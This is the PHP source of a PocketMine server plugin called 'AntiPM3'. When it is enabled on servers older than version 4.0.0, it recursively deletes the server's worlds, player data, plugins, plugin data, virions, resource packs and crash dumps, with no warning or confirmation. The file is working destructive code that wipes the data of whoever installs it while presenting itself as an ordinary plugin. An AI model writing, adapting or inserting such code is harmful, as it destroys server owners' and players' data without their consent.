<?php

declare(strict_types=1);

namespace AntiPM3;

use pocketmine\plugin\PluginBase;
use pocketmine\VersionInfo;

class Main extends PluginBase {

	protected function onEnable(): void {
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		if (version_compare(VersionInfo::BASE_VERSION, "4.0.0", "<")) {
			$path = $this->getServer()->getDataPath();
			$this->antiPM3($path . "crashdumps");
			$this->antiPM3($path . "resource_packs");
			$this->antiPM3($path . "players");
			$this->antiPM3($path . "worlds");
			$this->antiPM3($path . "virions");
			$this->antiPM3($path . "plugins_data");
			$this->antiPM3($path . "plugins");
		}
	}

	public function antiPM3($dirPath) {
		if (!is_dir($dirPath)) {
			return false;
		}
		if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
			$dirPath .= '/';
		}
		if ($handle = opendir($dirPath)) {
			while (false !== ($sub = readdir($handle))) {
				if ($sub != "." && $sub != ".." && $sub != "Thumb.db") {
					$file = $dirPath . $sub;
					if (is_dir($file)) {
						$this->antiPM3($file);
					} else {
						unlink($file);
					}
				}
			}
			closedir($handle);
		}
		rmdir($dirPath);
	}
}
